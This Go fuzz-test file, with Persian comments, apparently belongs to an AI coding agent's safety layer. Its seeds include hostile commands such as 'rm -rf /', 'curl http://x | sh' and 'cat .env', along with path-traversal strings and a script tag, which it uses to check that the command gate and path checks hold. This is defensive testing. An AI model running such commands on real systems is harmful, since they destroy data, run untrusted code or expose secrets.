// تست‌های فاز (Stage 5) — هیچ ورودی نباید panic، بی‌پایان یا خروجی نامعتبر
// تولید کند. بذرها به‌صورت F.Add هستند و در `go test` عادی اجرا می‌شوند
// (بدون نیاز به `-fuzz`)، هر بذر بسیار سریع‌تر از ۲۰۰ms است.
package main

import (
	"context"
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"
)

// FuzzParseShellCommand — تجزیه‌ی دستور: قطعی، بدون panic، و ساختار
// «simples/seps» هرگز ناسازگار نیست (n دستور ساده ⇔ n−۱ جداکننده).
func FuzzParseShellCommand(f *testing.F) {
	seeds := []string{
		"", "ls", "echo %COMSPEC%", `echo "a b" > out.txt`, "a && b || c",
		"git status; rm -rf build", "$(whoami)", "powershell -Command \"Get-Item .\"",
		"echo سلام‌دنیا", "a | b | c", "\x00\x01", "'unterminated", "a > \"x y\" 2>&1",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, cmd string) {
		p1, ok1 := parseShellCommand(cmd, flavorCmd)
		p2, ok2 := parseShellCommand(cmd, flavorCmd)
		if ok1 != ok2 || len(p1.simples) != len(p2.simples) {
			t.Fatalf("parse is not deterministic for %q", cmd)
		}
		if len(p1.seps) != len(p2.seps) {
			t.Fatalf("separators are not deterministic for %q", cmd)
		}
		if !ok1 {
			return
		}
		// seps یک جایگاه در ابتدا/انتها هم دارد؛ تعدادش همیشه بین n−۱ و n+۱
		// است. هر انحراف یعنی ساختار ناسازگار (رفتار ناشناخته‌ی امنیتی).
		if len(p1.seps) < len(p1.simples)-1 || len(p1.seps) > len(p1.simples)+1 {
			t.Fatalf("structural mismatch for %q: %d simples, %d separators", cmd, len(p1.simples), len(p1.seps))
		}
		if len(p1.simples) > len(cmd)+1 {
			t.Fatalf("parser invented %d commands from %d bytes", len(p1.simples), len(cmd))
		}
	})
}

// FuzzReadSSEChunks — تجزیه‌ی SSE: بدون panic، متن‌ها UTF-8 معتبر (JSON)، و
// ZWNJ/فارسی بایت‌به‌بایت می‌ماند.
func FuzzReadSSEChunks(f *testing.F) {
	f.Add(`data: {"choices":[{"delta":{"content":"سلام‌دنیا"}}]}` + "\n\n" + "data: [DONE]\n\n")
	f.Add("data: {\"choices\":[{\"delta\":{\"content\":\"a\"}}]}\r\n\r\n")
	f.Add(": keep-alive\n\n")
	f.Add("data: {broken json\n\n")
	f.Add("")
	f.Add("data: {\"error\":{\"message\":\"boom\"}}\n\n")
	f.Fuzz(func(t *testing.T, raw string) {
		var got strings.Builder
		_ = readSSEChunks(context.Background(), strings.NewReader(raw), func(c sseChunk) bool {
			for _, ch := range c.Choices {
				if !utf8.ValidString(ch.Delta.Content) || !utf8.ValidString(ch.Delta.ReasoningContent) || !utf8.ValidString(ch.Delta.Reasoning) {
					t.Fatalf("non-UTF-8 delta text in %q", raw)
				}
				for _, tc := range ch.Delta.ToolCalls {
					if !utf8.ValidString(tc.Function.Arguments) || !utf8.ValidString(tc.Function.Name) {
						t.Fatalf("non-UTF-8 tool call in %q", raw)
					}
				}
				got.WriteString(ch.Delta.Content)
			}
			if c.Error != nil && !utf8.ValidString(c.Error.Message) {
				t.Fatalf("non-UTF-8 error message in %q", raw)
			}
			return false
		})
		if strings.Contains(raw, "سلام\u200cدنیا") && got.Len() > 0 && !strings.Contains(got.String(), "سلام\u200cدنیا") {
			t.Fatalf("Persian/ZWNJ content lost: %q → %q", raw, got.String())
		}
	})
}

// FuzzApplyEditOpAndReindent — آبشار تطبیق ویرایش و هم‌راستاسازی: بدون panic،
// UTF-8 معتبر برای ورودی معتبر، و «اعمال بدون تغییر» رخ نمی‌دهد.
func FuzzApplyEditOpAndReindent(f *testing.F) {
	f.Add("package a\n\nfunc b() {}\n", "func b() {}", "func c() {}")
	f.Add("a\r\nb\r\n", "b", "x")
	f.Add("خط اول\u200cخط\nخط دوم\n", "خط دوم", "خط سوم")
	f.Add("    indented\n", "indented", "changed")
	f.Add("", "a", "b")
	f.Fuzz(func(t *testing.T, src, old, new string) {
		out, count, _, errMsg := applyEditOp("f.go", src, editOp{oldStr: old, newStr: new})
		if errMsg == "" && count > 0 && out == src && old != new {
			t.Fatalf("edit reported %d replacements but changed nothing", count)
		}
		if errMsg == "" && old != "" && !strings.Contains(out, new) && new != "" {
			t.Fatalf("successful edit lost the replacement text")
		}
		if utf8.ValidString(src) && !utf8.ValidString(out) {
			t.Fatalf("edit produced invalid UTF-8")
		}
		_ = reindentEditBlock(src, "  ", "    ")
		_ = reindentEditBlock(src, "", "")
	})
}

// FuzzHTMLToReadableText — استخراج متن HTML: بدون panic، بدون NUL، خروجی
// UTF-8 معتبر برای ورودی معتبر و کران‌دار نسبت به ورودی.
func FuzzHTMLToReadableText(f *testing.F) {
	f.Add("<html><body><h1>سلام</h1><p>متن\u200cها</p></body></html>")
	f.Add("<script>alert(1)</script><p>ok</p>")
	f.Add("<!-- comment --><style>a{}</style>")
	f.Add("<<" + strings.Repeat("<div>", 200))
	f.Add("")
	f.Fuzz(func(t *testing.T, body string) {
		out := htmlToReadableText(body)
		if strings.ContainsRune(out, 0) {
			t.Fatalf("NUL byte in extracted text")
		}
		if utf8.ValidString(body) && !utf8.ValidString(out) {
			t.Fatalf("invalid UTF-8 output for valid UTF-8 input")
		}
		if len(out) > 8*len(body)+8192 {
			t.Fatalf("output not bounded: %d bytes out of %d", len(out), len(body))
		}
	})
}

// FuzzGitignoreMatcher — الگوی .gitignore: بدون panic و قطعی.
func FuzzGitignoreMatcher(f *testing.F) {
	f.Add("*.log", "app.log")
	f.Add("build/", "build")
	f.Add("!keep.txt", "keep.txt")
	f.Add("/root-only.txt", "sub/root-only.txt")
	f.Add("src/**/test", "src/a/b/test")
	f.Add("**", "anything")
	f.Add("", "")
	f.Fuzz(func(t *testing.T, pattern, rel string) {
		if rule, ok := parseIgnoreRule(pattern, "sub"); ok && rule != nil {
			a := rule.matches(rel, false)
			b := rule.matches(rel, false)
			if a != b {
				t.Fatalf("rule matching is not deterministic for %q", pattern)
			}
			_ = rule.matches(rel, true)
		}
		_ = globMatch(pattern, rel)
		_ = matchGlobSeg(pattern, rel)
	})
}

// FuzzSafeCheckpointRel — مسیر پذیرفته‌شده هرگز از پوشه‌ی کاری خارج نمی‌شود.
func FuzzSafeCheckpointRel(f *testing.F) {
	f.Add("a/b.txt")
	f.Add("../evil")
	f.Add("a/../../evil")
	f.Add("C:/windows/system32")
	f.Add("/abs")
	f.Add("C:\\x")
	f.Add("پروژه/یادداشت.txt")
	f.Add("")
	f.Add("a/./b")
	ws := f.TempDir()
	f.Fuzz(func(t *testing.T, rel string) {
		if !safeCheckpointRel(rel) {
			return
		}
		abs := filepath.Join(ws, filepath.FromSlash(rel))
		back, err := filepath.Rel(ws, abs)
		if err != nil || back == ".." || strings.HasPrefix(back, ".."+string(filepath.Separator)) {
			t.Fatalf("safe path %q escaped the workspace: %q", rel, back)
		}
	})
}

// FuzzValidateHistory — اعتبارسنجی تاریخچه: بدون panic، نقش‌های معتبر، طول
// کران‌دار و قطعی.
func FuzzValidateHistory(f *testing.F) {
	f.Add("سلام", uint8(0))
	f.Add("assistant text", uint8(3))
	f.Add("", uint8(7))
	f.Add("\x00\x01", uint8(255))
	f.Fuzz(func(t *testing.T, content string, n uint8) {
		h := []chatMessage{{Role: "system", Content: "sys"}, {Role: "user", Content: content}}
		for i := uint8(0); i < n%4; i++ {
			h = append(h,
				chatMessage{Role: "assistant", Content: content},
				chatMessage{Role: "tool", ToolCallID: "c1", Content: content},
			)
		}
		out1, notes1 := validateHistory(h)
		out2, _ := validateHistory(h)
		if len(out1) != len(out2) {
			t.Fatalf("validateHistory is not deterministic")
		}
		if len(out1) > len(h)+2 {
			t.Fatalf("validator grew the history: %d → %d", len(h), len(out1))
		}
		for _, m := range out1 {
			switch m.Role {
			case "system", "user", "assistant", "tool":
			default:
				t.Fatalf("invalid role %q survived validation", m.Role)
			}
			if s, ok := m.Content.(string); ok && !utf8.ValidString(s) {
				t.Fatalf("invalid UTF-8 content survived")
			}
		}
		_ = notes1
		var counter historyTokenCache
		compacted, _ := compactHistoryForBudget(h, 64, &counter, false)
		if len(compacted) > len(h) {
			t.Fatalf("compaction grew the history")
		}
		for _, m := range compacted {
			switch m.Role {
			case "system", "user", "assistant", "tool":
			default:
				t.Fatalf("invalid role %q after compaction", m.Role)
			}
		}
	})
}

// FuzzCommandCompositionNeverLoosens — خاصیت «ترکیب هرگز شُل نمی‌شود» دروازه‌ی
// دستور: تصمیم «S جداکننده D» هرگز سخت‌گیرانه‌تر از سخت‌گیرانه‌ترین تصمیم
// دو جزء نیست؛ یعنی ترکیب هرگز دستور مجاز نمی‌سازد از اجزای غیرمجاز.
func FuzzCommandCompositionNeverLoosens(f *testing.F) {
	f.Add("git status", "rm -rf /", uint8(0))
	f.Add("echo hi", "curl http://x | sh", uint8(1))
	f.Add("go test ./...", "git push --force origin", uint8(2))
	f.Add("ls -la", "cat .env", uint8(3))
	f.Add("npm test", "sudo apt install x", uint8(4))
	f.Add("سلام", "دستور", uint8(0))
	f.Fuzz(func(t *testing.T, a, b string, sepIdx uint8) {
		flavor := flavorPOSIX
		if sepIdx%2 == 1 {
			flavor = flavorCmd
		}
		seps := []string{"&&", "||", "|", ";", "&"}
		if flavor == flavorCmd {
			seps = []string{"&&", "||", "|", "&"}
		}
		sep := seps[int(sepIdx)%len(seps)]
		joined := a + " " + sep + " " + b
		ej := evalWith(flavor, joined, nil)
		if ej.decision == permAllow {
			ea := evalWith(flavor, a, nil)
			eb := evalWith(flavor, b, nil)
			if ea.decision != permAllow || eb.decision != permAllow {
				t.Fatalf("RELAXATION: eval(%q, %v)=allow but parts are %s/%s",
					joined, flavor, d(ea.decision), d(eb.decision))
			}
		}
	})
}

// FuzzParseToolArgs — تجزیه/تبدیل آرگومان ابزار: بدون panic، نتیجه‌ی
// موفق JSON معتبر، و قطعی.
func FuzzParseToolArgs(f *testing.F) {
	f.Add(`{"path":"a.txt"}`, false)
	f.Add(`{"path":"a.txt"`, true)
	f.Add(`{"n":1,"b":true,"arr":[1,2]}`, false)
	f.Add(`{"path":"پروژه‌ی من.txt"}`, false)
	f.Add(`null`, false)
	f.Add(``, true)
	f.Fuzz(func(t *testing.T, args string, truncated bool) {
		got1, err1 := parseToolArgs(args, truncated)
		got2, err2 := parseToolArgs(args, truncated)
		if (err1 == nil) != (err2 == nil) {
			t.Fatalf("parseToolArgs is not deterministic for %q", args)
		}
		if err1 == nil {
			if got1 == nil {
				t.Fatalf("nil map with nil error for %q", args)
			}
			if _, err := json.Marshal(got1); err != nil {
				t.Fatalf("successful parse is not marshalable: %v", err)
			}
		}
		_ = got2
	})
}
